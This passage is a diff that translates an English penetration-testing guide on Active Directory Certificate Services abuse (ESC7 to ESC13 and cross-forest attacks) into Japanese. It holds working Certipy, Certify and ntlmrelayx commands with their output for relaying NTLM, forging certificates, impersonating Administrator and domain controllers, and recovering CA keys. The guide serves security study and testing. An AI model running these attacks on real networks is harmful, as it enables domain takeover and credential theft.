 [*] Successfully enabled 'SubCA' on 'corp-DC-CA'
 ```
+この攻撃の前提条件を満たしている場合、**`SubCA` テンプレートに基づいて証明書を要求することから始めることができます**。
 
-If we have fulfilled the prerequisites for this attack, we can start by **requesting a certificate based on the `SubCA` template**.
-
-**This request will be denie**d, but we will save the private key and note down the request ID.
-
+**この要求は拒否されます**が、プライベートキーを保存し、要求IDをメモしておきます。
 ```bash
 certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
@@ -338,18 +303,14 @@ Would you like to save the private key? (y/N) y
 [*] Saved private key to 785.key
 [-] Failed to request certificate
 ```
-
-With our **`Manage CA` and `Manage Certificates`**, we can then **issue the failed certificate** request with the `ca` command and the `-issue-request <request ID>` parameter.
-
+私たちの **`Manage CA` と `Manage Certificates`** を使用して、`ca` コマンドと `-issue-request <request ID>` パラメーターを使って **失敗した証明書** リクエストを **発行** することができます。
 ```bash
 certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
 [*] Successfully issued certificate
 ```
-
-And finally, we can **retrieve the issued certificate** with the `req` command and the `-retrieve <request ID>` parameter.
-
+そして最後に、`req`コマンドと`-retrieve <request ID>`パラメータを使用して**発行された証明書を取得**できます。
 ```bash
 certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
@@ -361,60 +322,52 @@ Certipy v4.0.0 - by Oliver Lyak (ly4k)
 [*] Loaded private key from '785.key'
 [*] Saved certificate and private key to 'administrator.pfx'
 ```
+## NTLMリレーによるAD CS HTTPエンドポイント – ESC8
 
-## NTLM Relay to AD CS HTTP Endpoints – ESC8
-
-### Explanation
+### 説明
 
 > [!NOTE]
-> In environments where **AD CS is installed**, if a **web enrollment endpoint vulnerable** exists and at least one **certificate template is published** that permits **domain computer enrollment and client authentication** (such as the default **`Machine`** template), it becomes possible for **any computer with the spooler service active to be compromised by an attacker**!
+> **AD CSがインストールされている**環境では、**脆弱なウェブ登録エンドポイント**が存在し、少なくとも1つの**証明書テンプレートが公開されている**場合、**ドメインコンピュータの登録とクライアント認証を許可する**（デフォルトの**`Machine`**テンプレートなど）、**スプーラーサービスがアクティブな任意のコンピュータが攻撃者によって侵害される可能性があります**！
 
-Several **HTTP-based enrollment methods** are supported by AD CS, made available through additional server roles that administrators may install. These interfaces for HTTP-based certificate enrollment are susceptible to **NTLM relay attacks**. An attacker, from a **compromised machine, can impersonate any AD account that authenticates via inbound NTLM**. While impersonating the victim account, these web interfaces can be accessed by an attacker to **request a client authentication certificate using the `User` or `Machine` certificate templates**.
+AD CSは、管理者がインストールできる追加のサーバーロールを通じて利用可能な**HTTPベースの登録方法**をいくつかサポートしています。これらのHTTPベースの証明書登録インターフェースは、**NTLMリレー攻撃**に対して脆弱です。攻撃者は、**侵害されたマシンから、受信NTLMを介して認証される任意のADアカウントを偽装することができます**。被害者アカウントを偽装している間、攻撃者はこれらのウェブインターフェースにアクセスして、**`User`または`Machine`証明書テンプレートを使用してクライアント認証証明書を要求することができます**。
 
-- The **web enrollment interface** (an older ASP application available at `http://<caserver>/certsrv/`), defaults to HTTP only, which does not offer protection against NTLM relay attacks. Additionally, it explicitly permits only NTLM authentication through its Authorization HTTP header, rendering more secure authentication methods like Kerberos inapplicable.
-- The **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service, and **Network Device Enrollment Service** (NDES) by default support negotiate authentication via their Authorization HTTP header. Negotiate authentication **supports both** Kerberos and **NTLM**, allowing an attacker to **downgrade to NTLM** authentication during relay attacks. Although these web services enable HTTPS by default, HTTPS alone **does not safeguard against NTLM relay attacks**. Protection from NTLM relay attacks for HTTPS services is only possible when HTTPS is combined with channel binding. Regrettably, AD CS does not activate Extended Protection for Authentication on IIS, which is required for channel binding.
+- **ウェブ登録インターフェース**（`http://<caserver>/certsrv/`で利用可能な古いASPアプリケーション）は、デフォルトでHTTPのみを使用し、NTLMリレー攻撃に対する保護を提供しません。さらに、Authorization HTTPヘッダーを通じてNTLM認証のみを明示的に許可しており、Kerberosのようなより安全な認証方法を適用できなくしています。
+- **証明書登録サービス**（CES）、**証明書登録ポリシー**（CEP）Webサービス、および**ネットワークデバイス登録サービス**（NDES）は、デフォルトでAuthorization HTTPヘッダーを介してネゴシエート認証をサポートしています。ネゴシエート認証は**KerberosとNTLMの両方をサポート**しており、攻撃者はリレー攻撃中に**NTLMにダウングレード**することができます。これらのウェブサービスはデフォルトでHTTPSを有効にしていますが、HTTPSだけでは**NTLMリレー攻撃から保護されません**。HTTPSサービスのNTLMリレー攻撃からの保護は、HTTPSがチャネルバインディングと組み合わさった場合にのみ可能です。残念ながら、AD CSはIISでの認証のための拡張保護を有効にしておらず、チャネルバインディングに必要です。
 
-A common **issue** with NTLM relay attacks is the **short duration of NTLM sessions** and the inability of the attacker to interact with services that **require NTLM signing**.
+NTLMリレー攻撃の一般的な**問題**は、**NTLMセッションの短い期間**と、攻撃者が**NTLM署名を必要とするサービス**と相互作用できないことです。
 
-Nevertheless, this limitation is overcome by exploiting an NTLM relay attack to acquire a certificate for the user, as the certificate's validity period dictates the session's duration, and the certificate can be employed with services that **mandate NTLM signing**. For instructions on utilizing a stolen certificate, refer to:
+それにもかかわらず、この制限は、ユーザーのために証明書を取得するためにNTLMリレー攻撃を利用することで克服されます。証明書の有効期間がセッションの期間を決定し、証明書は**NTLM署名を義務付けるサービス**で使用できます。盗まれた証明書を利用する方法については、次を参照してください：
 
 {{#ref}}
 account-persistence.md
 {{#endref}}
 
-Another limitation of NTLM relay attacks is that **an attacker-controlled machine must be authenticated to by a victim account**. The attacker could either wait or attempt to **force** this authentication:
+NTLMリレー攻撃のもう一つの制限は、**攻撃者が制御するマシンが被害者アカウントによって認証される必要がある**ことです。攻撃者は待つか、**この認証を強制しようとする**ことができます：
 
 {{#ref}}
 ../printers-spooler-service-abuse.md
 {{#endref}}
 
-### **Abuse**
+### **悪用**
 
-[**Certify**](https://github.com/GhostPack/Certify)’s `cas` enumerates **enabled HTTP AD CS endpoints**:
-
+[**Certify**](https://github.com/GhostPack/Certify)の`cas`は、**有効なHTTP AD CSエンドポイント**を列挙します：
 ```
 Certify.exe cas
 ```
-
 <figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>
 
-The `msPKI-Enrollment-Servers` property is used by enterprise Certificate Authorities (CAs) to store Certificate Enrollment Service (CES) endpoints. These endpoints can be parsed and listed by utilizing the tool **Certutil.exe**:
-
+`msPKI-Enrollment-Servers` プロパティは、エンタープライズ証明書認証局 (CA) によって証明書登録サービス (CES) エンドポイントを保存するために使用されます。これらのエンドポイントは、ツール **Certutil.exe** を利用して解析およびリスト化できます:
 ```
 certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
 ```
-
 <figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
-
 ```powershell
 Import-Module PSPKI
 Get-CertificationAuthority | select Name,Enroll* | Format-List *
 ```
-
 <figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>
 
-#### Abuse with Certify
-
+#### Certifyを使った悪用
 ```bash
 ## In the victim machine
 # Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
@@ -429,13 +382,11 @@ proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2sup
 # Force authentication from victim to compromised machine with port forwards
 execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
 ```
-
 #### Abuse with [Certipy](https://github.com/ly4k/Certipy)
 
-The request for a certificate is made by Certipy by default based on the template `Machine` or `User`, determined by whether the account name being relayed ends in `$`. The specification of an alternative template can be achieved through the use of the `-template` parameter.
+Certipyによる証明書のリクエストは、アカウント名が`$`で終わるかどうかに基づいて、デフォルトで`Machine`または`User`テンプレートに基づいて行われます。代替テンプレートの指定は、`-template`パラメータを使用することで実現できます。
 
-A technique like [PetitPotam](https://github.com/ly4k/PetitPotam) can then be employed to coerce authentication. When dealing with domain controllers, the specification of `-template DomainController` is required.
-
+その後、[PetitPotam](https://github.com/ly4k/PetitPotam)のような技術を使用して認証を強制することができます。ドメインコントローラーを扱う場合、`-template DomainController`の指定が必要です。
 ```bash
 certipy relay -ca ca.corp.local
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
@@ -448,182 +399,146 @@ Certipy v4.0.0 - by Oliver Lyak (ly4k)
 [*] Saved certificate and private key to 'administrator.pfx'
 [*] Exiting...
 ```
-
 ## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>
 
-### Explanation
+### 説明
 
-The new value **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) for **`msPKI-Enrollment-Flag`**, referred to as ESC9, prevents the embedding of the **new `szOID_NTDS_CA_SECURITY_EXT` security extension** in a certificate. This flag becomes relevant when `StrongCertificateBindingEnforcement` is set to `1` (the default setting), which contrasts with a setting of `2`. Its relevance is heightened in scenarios where a weaker certificate mapping for Kerberos or Schannel might be exploited (as in ESC10), given that the absence of ESC9 would not alter the requirements.
+新しい値 **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) は **`msPKI-Enrollment-Flag`** のためのもので、ESC9と呼ばれ、証明書に **新しい `szOID_NTDS_CA_SECURITY_EXT` セキュリティ拡張** を埋め込むことを防ぎます。このフラグは `StrongCertificateBindingEnforcement` が `1`（デフォルト設定）に設定されている場合に関連性を持ち、`2` の設定とは対照的です。ESC9がない場合、要件が変更されないため、KerberosやSchannelのための弱い証明書マッピングが悪用される可能性があるシナリオでは、その関連性が高まります（ESC10のように）。
 
-The conditions under which this flag's setting becomes significant include:
+このフラグの設定が重要になる条件は以下の通りです：
 
-- `StrongCertificateBindingEnforcement` is not adjusted to `2` (with the default being `1`), or `CertificateMappingMethods` includes the `UPN` flag.
-- The certificate is marked with the `CT_FLAG_NO_SECURITY_EXTENSION` flag within the `msPKI-Enrollment-Flag` setting.
-- Any client authentication EKU is specified by the certificate.
-- `GenericWrite` permissions are available over any account to compromise another.
+- `StrongCertificateBindingEnforcement` が `2` に調整されていない（デフォルトは `1`）、または `CertificateMappingMethods` に `UPN` フラグが含まれている。
+- 証明書が `msPKI-Enrollment-Flag` 設定内で `CT_FLAG_NO_SECURITY_EXTENSION` フラグでマークされている。
+- 証明書によってクライアント認証 EKU が指定されている。
+- 他のアカウントを妥協するために、任意のアカウントに対して `GenericWrite` 権限が利用可能である。
 
-### Abuse Scenario
+### 悪用シナリオ
 
-Suppose `John@corp.local` holds `GenericWrite` permissions over `Jane@corp.local`, with the goal to compromise `Administrator@corp.local`. The `ESC9` certificate template, which `Jane@corp.local` is permitted to enroll in, is configured with the `CT_FLAG_NO_SECURITY_EXTENSION` flag in its `msPKI-Enrollment-Flag` setting.
+`John@corp.local` が `Jane@corp.local` に対して `GenericWrite` 権限を持ち、`Administrator@corp.local` を妥協することを目指しているとします。`Jane@corp.local` が登録を許可されている `ESC9` 証明書テンプレートは、その `msPKI-Enrollment-Flag` 設定に `CT_FLAG_NO_SECURITY_EXTENSION` フラグが設定されています。
 
-Initially, `Jane`'s hash is acquired using Shadow Credentials, thanks to `John`'s `GenericWrite`:
-
+最初に、`Jane` のハッシュは `John` の `GenericWrite` により、Shadow Credentials を使用して取得されます：
 ```bash
 certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
 ```
-
-Subsequently, `Jane`'s `userPrincipalName` is modified to `Administrator`, purposely omitting the `@corp.local` domain part:
-
+その後、`Jane`の`userPrincipalName`が`Administrator`に変更され、`@corp.local`ドメイン部分が意図的に省略されます：
 ```bash
 certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
 ```
+この変更は制約に違反せず、`Administrator@corp.local`が`Administrator`の`userPrincipalName`として区別されるためです。
 
-This modification does not violate constraints, given that `Administrator@corp.local` remains distinct as `Administrator`'s `userPrincipalName`.
-
-Following this, the `ESC9` certificate template, marked vulnerable, is requested as `Jane`:
-
+これに続いて、脆弱であるとマークされた`ESC9`証明書テンプレートが`Jane`として要求されます：
 ```bash
 certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
 ```
+証明書の `userPrincipalName` は `Administrator` を反映しており、「object SID」はありません。
 
-It's noted that the certificate's `userPrincipalName` reflects `Administrator`, devoid of any “object SID”.
-
-`Jane`'s `userPrincipalName` is then reverted to her original, `Jane@corp.local`:
-
+`Jane` の `userPrincipalName` は元の `Jane@corp.local` に戻されます：
 ```bash
 certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
 ```
-
-Attempting authentication with the issued certificate now yields the NT hash of `Administrator@corp.local`. The command must include `-domain <domain>` due to the certificate's lack of domain specification:
-
+発行された証明書を使用して認証を試みると、`Administrator@corp.local`のNTハッシュが得られます。証明書にドメインの指定がないため、コマンドには`-domain <domain>`を含める必要があります：
 ```bash
 certipy auth -pfx adminitrator.pfx -domain corp.local
 ```
+## 弱い証明書マッピング - ESC10
 
-## Weak Certificate Mappings - ESC10
+### 説明
 
-### Explanation
+ドメインコントローラー上の2つのレジストリキー値がESC10によって参照されています：
 
-Two registry key values on the domain controller are referred to by ESC10:
+- `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel`の下の`CertificateMappingMethods`のデフォルト値は`0x18`（`0x8 | 0x10`）で、以前は`0x1F`に設定されていました。
+- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc`の下の`StrongCertificateBindingEnforcement`のデフォルト設定は`1`で、以前は`0`でした。
 
-- The default value for `CertificateMappingMethods` under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` is `0x18` (`0x8 | 0x10`), previously set to `0x1F`.
-- The default setting for `StrongCertificateBindingEnforcement` under `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` is `1`, previously `0`.
+**ケース 1**
 
-**Case 1**
+`StrongCertificateBindingEnforcement`が`0`に設定されている場合。
 
-When `StrongCertificateBindingEnforcement` is configured as `0`.
+**ケース 2**
 
-**Case 2**
+`CertificateMappingMethods`に`UPN`ビット（`0x4`）が含まれている場合。
 
-If `CertificateMappingMethods` includes the `UPN` bit (`0x4`).
+### 悪用ケース 1
 
-### Abuse Case 1
+`StrongCertificateBindingEnforcement`が`0`に設定されている場合、`GenericWrite`権限を持つアカウントAは、任意のアカウントBを危険にさらすために悪用される可能性があります。
 
-With `StrongCertificateBindingEnforcement` configured as `0`, an account A with `GenericWrite` permissions can be exploited to compromise any account B.
+例えば、`Jane@corp.local`に対して`GenericWrite`権限を持つ攻撃者が、`Administrator@corp.local`を危険にさらそうとします。この手順はESC9と同様で、任意の証明書テンプレートを利用することができます。
 
-For instance, having `GenericWrite` permissions over `Jane@corp.local`, an attacker aims to compromise `Administrator@corp.local`. The procedure mirrors ESC9, allowing any certificate template to be utilized.
-
-Initially, `Jane`'s hash is retrieved using Shadow Credentials, exploiting the `GenericWrite`.
-
+最初に、`Jane`のハッシュがShadow Credentialsを使用して取得され、`GenericWrite`を悪用します。
 ```bash
 certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
 ```
-
-Subsequently, `Jane`'s `userPrincipalName` is altered to `Administrator`, deliberately omitting the `@corp.local` portion to avoid a constraint violation.
-
+その後、`Jane`の`userPrincipalName`が`Administrator`に変更され、制約違反を避けるために`@corp.local`部分が故意に省略されます。
 ```bash
 certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
 ```
-
-Following this, a certificate enabling client authentication is requested as `Jane`, using the default `User` template.
-
+これに続いて、デフォルトの `User` テンプレートを使用して、`Jane` としてクライアント認証を有効にする証明書が要求されます。
 ```bash
 certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
 ```
-
-`Jane`'s `userPrincipalName` is then reverted to its original, `Jane@corp.local`.
-
+`Jane`の`userPrincipalName`は元の`Jane@corp.local`に戻されます。
 ```bash
 certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
 ```
-
-Authenticating with the obtained certificate will yield the NT hash of `Administrator@corp.local`, necessitating the specification of the domain in the command due to the absence of domain details in the certificate.
-
+取得した証明書で認証すると、`Administrator@corp.local`のNTハッシュが得られます。これは、証明書にドメインの詳細が含まれていないため、コマンドでドメインを指定する必要があります。
 ```bash
 certipy auth -pfx administrator.pfx -domain corp.local
 ```
-
 ### Abuse Case 2
 
-With the `CertificateMappingMethods` containing the `UPN` bit flag (`0x4`), an account A with `GenericWrite` permissions can compromise any account B lacking a `userPrincipalName` property, including machine accounts and the built-in domain administrator `Administrator`.
+`CertificateMappingMethods` に `UPN` ビットフラグ (`0x4`) が含まれている場合、`GenericWrite` 権限を持つアカウント A は、`userPrincipalName` プロパティを欠く任意のアカウント B を侵害することができます。これには、マシンアカウントや組み込みのドメイン管理者 `Administrator` が含まれます。
 
-Here, the goal is to compromise `DC$@corp.local`, starting with obtaining `Jane`'s hash through Shadow Credentials, leveraging the `GenericWrite`.
-
+ここでの目標は、`Jane` のハッシュを Shadow Credentials を通じて取得し、`GenericWrite` を利用して `DC$@corp.local` を侵害することです。
 ```bash
 certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
 ```
-
-`Jane`'s `userPrincipalName` is then set to `DC$@corp.local`.
-
+`Jane`の`userPrincipalName`は`DC$@corp.local`に設定されます。
 ```bash
 certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
 ```
-
-A certificate for client authentication is requested as `Jane` using the default `User` template.
-
+`Jane`としてデフォルトの`User`テンプレートを使用してクライアント認証のための証明書が要求されます。
 ```bash
 certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
 ```
-
-`Jane`'s `userPrincipalName` is reverted to its original after this process.
-
+`Jane`の`userPrincipalName`は、このプロセスの後に元に戻ります。
 ```bash
 certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
 ```
-
-To authenticate via Schannel, Certipy’s `-ldap-shell` option is utilized, indicating authentication success as `u:CORP\DC$`.
-
+Schannelを介して認証するには、Certipyの`-ldap-shell`オプションが使用され、認証成功は`u:CORP\DC$`として示されます。
 ```bash
 certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
 ```
-
-Through the LDAP shell, commands such as `set_rbcd` enable Resource-Based Constrained Delegation (RBCD) attacks, potentially compromising the domain controller.
-
+LDAPシェルを通じて、`set_rbcd`のようなコマンドはリソースベースの制約付き委任（RBCD）攻撃を可能にし、ドメインコントローラーを危険にさらす可能性があります。
 ```bash
 certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
 ```
+この脆弱性は、`userPrincipalName`が欠如しているか、`sAMAccountName`と一致しない任意のユーザーアカウントにも拡張され、デフォルトの`Administrator@corp.local`は、その高いLDAP権限とデフォルトで`userPrincipalName`がないため、主要なターゲットとなります。
 
-This vulnerability also extends to any user account lacking a `userPrincipalName` or where it does not match the `sAMAccountName`, with the default `Administrator@corp.local` being a prime target due to its elevated LDAP privileges and the absence of a `userPrincipalName` by default.
+## NTLMをICPRに中継 - ESC11
 
-## Relaying NTLM to ICPR - ESC11
+### 説明
 
-### Explanation
+CAサーバーが`IF_ENFORCEENCRYPTICERTREQUEST`で構成されていない場合、RPCサービスを介して署名なしでNTLM中継攻撃を行うことができます。[こちらを参照](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)。
 
-If CA Server Do not configured with `IF_ENFORCEENCRYPTICERTREQUEST`, it can be makes NTLM relay attacks without signing via RPC service. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).
-
-You can use `certipy` to enumerate if `Enforce Encryption for Requests` is Disabled and certipy will show `ESC11` Vulnerabilities.
-
+`certipy`を使用して、`リクエストの暗号化を強制`が無効になっているかどうかを列挙でき、certipyは`ESC11`の脆弱性を表示します。
 ```bash
 $ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
 Certificate Authorities
-  0
-    CA Name                             : DC01-CA
-    DNS Name                            : DC01.domain.local
-    Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
-    ....
-    Enforce Encryption for Requests     : Disabled
-    ....
-    [!] Vulnerabilities
-      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue
+0
+CA Name                             : DC01-CA
+DNS Name                            : DC01.domain.local
+Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
+....
+Enforce Encryption for Requests     : Disabled
+....
+[!] Vulnerabilities
+ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue
 
 ```
-
 ### Abuse Scenario
 
-It need to setup a relay server:
-
+リレーサーバーを設定する必要があります:
 ```bash
 $ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
 Certipy v4.7.0 - by Oliver Lyak (ly4k)
@@ -642,33 +557,29 @@ Certipy v4.7.0 - by Oliver Lyak (ly4k)
 [*] Saved certificate and private key to 'administrator.pfx'
 [*] Exiting...
 ```
+注意: ドメインコントローラーの場合、DomainControllerで`-template`を指定する必要があります。
 
-Note: For domain controllers, we must specify `-template` in DomainController.
-
-Or using [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :
-
+または、[sploutchyのimpacketのフォーク](https://github.com/sploutchy/impacket)を使用します:
 ```bash
 $ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
 ```
-
 ## Shell access to ADCS CA with YubiHSM - ESC12
 
-### Explanation
+### 説明
 
-Administrators can set up the Certificate Authority to store it on an external device like the "Yubico YubiHSM2".
+管理者は、証明書機関を「Yubico YubiHSM2」のような外部デバイスに保存するように設定できます。
 
-If USB device connected to the CA server via a USB port, or a USB device server in case of the CA server is a virtual machine, an authentication key (sometimes referred to as a "password") is required for the Key Storage Provider to generate and utilize keys in the YubiHSM.
+USBデバイスがCAサーバーにUSBポート経由で接続されている場合、またはCAサーバーが仮想マシンの場合はUSBデバイスサーバーが接続されている場合、YubiHSM内でキーを生成および利用するために、認証キー（時には「パスワード」と呼ばれる）が必要です。
 
-This key/password is stored in the registry under `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` in cleartext.
+このキー/パスワードは、レジストリの`HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`に平文で保存されています。
 
-Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).
+参照は[こちら](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)です。
 
-### Abuse Scenario
+### 悪用シナリオ
 
-If the CA's private key stored on a physical USB device when you got a shell access, it is possible to recover the key.
+CAの秘密鍵が物理USBデバイスに保存されている場合、シェルアクセスを取得すると、その鍵を復元することが可能です。
 
-In first, you need to obtain the CA certificate (this is public) and then:
-
+まず、CA証明書を取得する必要があります（これは公開されています）そして：
 ```cmd
 # import it to the user store with CA certificate
 $ certutil -addstore -user my <CA certificate file>
@@ -676,19 +587,17 @@ $ certutil -addstore -user my <CA certificate file>
 # Associated with the private key in the YubiHSM2 device
 $ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
 ```
+最終的に、certutil `-sign` コマンドを使用して、CA証明書とその秘密鍵を使用して新しい任意の証明書を偽造します。
 
-Finally, use the certutil `-sign` command to forge a new arbitrary certificate using the CA certificate and its private key.
+## OIDグループリンクの悪用 - ESC13
 
-## OID Group Link Abuse - ESC13
+### 説明
 
-### Explanation
+`msPKI-Certificate-Policy` 属性は、発行ポリシーを証明書テンプレートに追加することを許可します。ポリシーを発行する責任のある `msPKI-Enterprise-Oid` オブジェクトは、PKI OIDコンテナの構成命名コンテキスト (CN=OID,CN=Public Key Services,CN=Services) で発見できます。このオブジェクトの `msDS-OIDToGroupLink` 属性を使用して、ポリシーをADグループにリンクすることができ、システムは証明書を提示するユーザーをグループのメンバーであるかのように認可できます。[ここに参照](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53)。
 
-The `msPKI-Certificate-Policy` attribute allows the issuance policy to be added to the certificate template. The `msPKI-Enterprise-Oid` objects that are responsible for issuing policies can be discovered in the Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) of the PKI OID container. A policy can be linked to an AD group using this object's `msDS-OIDToGroupLink` attribute, enabling a system to authorize a user who presents the certificate as though he were a member of the group. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).
+言い換えれば、ユーザーが証明書を登録する権限を持ち、証明書がOIDグループにリンクされている場合、ユーザーはこのグループの特権を引き継ぐことができます。
 
-In other words, when a user has permission to enroll a certificate and the certificate is link to an OID group, the user can inherit the privileges of this group.
-
-Use [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) to find OIDToGroupLink:
-
+[Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) を使用してOIDToGroupLinkを見つけます:
 ```powershell
 Enumerating OIDs
 ------------------------
@@ -710,35 +619,31 @@ OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.139243
 OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
 ------------------------
 ```
+### 悪用シナリオ
 
-### Abuse Scenario
+ユーザー権限を見つけるには `certipy find` または `Certify.exe find /showAllPermissions` を使用します。
 
-Find a user permission it can use `certipy find` or `Certify.exe find /showAllPermissions`.
+もし `John` が `VulnerableTemplate` に登録する権限を持っている場合、そのユーザーは `VulnerableGroup` グループの特権を継承できます。
 
-If `John` have have permission to enroll `VulnerableTemplate`, the user can inherit the privileges of `VulnerableGroup` group.
-
-All it need to do just specify the template, it will get a certificate with OIDToGroupLink rights.
-
+必要なことは、テンプレートを指定するだけで、OIDToGroupLink 権利を持つ証明書を取得します。
 ```bash
 certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
 ```
+## パッシブボイスで説明された証明書を使用したフォレストの侵害
 
-## Compromising Forests with Certificates Explained in Passive Voice
+### 妥協されたCAによるフォレスト信頼の破壊
 
-### Breaking of Forest Trusts by Compromised CAs
+**クロスフォレスト登録**の設定は比較的簡単です。リソースフォレストの**ルートCA証明書**は管理者によって**アカウントフォレストに公開され**、リソースフォレストの**エンタープライズCA**証明書は**各アカウントフォレストの`NTAuthCertificates`およびAIAコンテナに追加されます**。この配置は、リソースフォレストの**CAがPKIを管理するすべての他のフォレストに対して完全な制御を持つ**ことを明確にします。このCAが**攻撃者によって妥協された場合**、リソースフォレストとアカウントフォレストのすべてのユーザーの証明書が**彼らによって偽造される可能性があり**、これによりフォレストのセキュリティ境界が破られることになります。
 
-The configuration for **cross-forest enrollment** is made relatively straightforward. The **root CA certificate** from the resource forest is **published to the account forests** by administrators, and the **enterprise CA** certificates from the resource forest are **added to the `NTAuthCertificates` and AIA containers in each account forest**. To clarify, this arrangement grants the **CA in the resource forest complete control** over all other forests for which it manages PKI. Should this CA be **compromised by attackers**, certificates for all users in both the resource and account forests could be **forged by them**, thereby breaking the security boundary of the forest.
+### 外部プリンシパルに付与された登録権限
 
-### Enrollment Privileges Granted to Foreign Principals
+マルチフォレスト環境では、**証明書テンプレートを公開するエンタープライズCA**に関して注意が必要です。これにより、**認証されたユーザーまたは外部プリンシパル**（エンタープライズCAが属するフォレスト外のユーザー/グループ）が**登録および編集権限**を持つことができます。\
+信頼を越えた認証の際、**認証されたユーザーSID**がADによってユーザーのトークンに追加されます。したがって、ドメインが**認証されたユーザーの登録権限を許可するテンプレートを持つエンタープライズCA**を持っている場合、異なるフォレストのユーザーが**テンプレートに登録される可能性があります**。同様に、**テンプレートによって外部プリンシパルに明示的に登録権限が付与されると**、**クロスフォレストアクセス制御関係が作成され**、1つのフォレストのプリンシパルが**別のフォレストのテンプレートに登録できるようになります**。
 
-In multi-forest environments, caution is required concerning Enterprise CAs that **publish certificate templates** which allow **Authenticated Users or foreign principals** (users/groups external to the forest to which the Enterprise CA belongs) **enrollment and edit rights**.\
-Upon authentication across a trust, the **Authenticated Users SID** is added to the user’s token by AD. Thus, if a domain possesses an Enterprise CA with a template that **allows Authenticated Users enrollment rights**, a template could potentially be **enrolled in by a user from a different forest**. Likewise, if **enrollment rights are explicitly granted to a foreign principal by a template**, a **cross-forest access-control relationship is thereby created**, enabling a principal from one forest to **enroll in a template from another forest**.
-
-Both scenarios lead to an **increase in the attack surface** from one forest to another. The settings of the certificate template could be exploited by an attacker to obtain additional privileges in a foreign domain.
+どちらのシナリオも、1つのフォレストから別のフォレストへの**攻撃面の増加**をもたらします。証明書テンプレートの設定は、攻撃者によって悪用され、外部ドメインでの追加権限を取得することができます。
 
 <figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
 {{#include ../../../banners/hacktricks-training.md}}
-
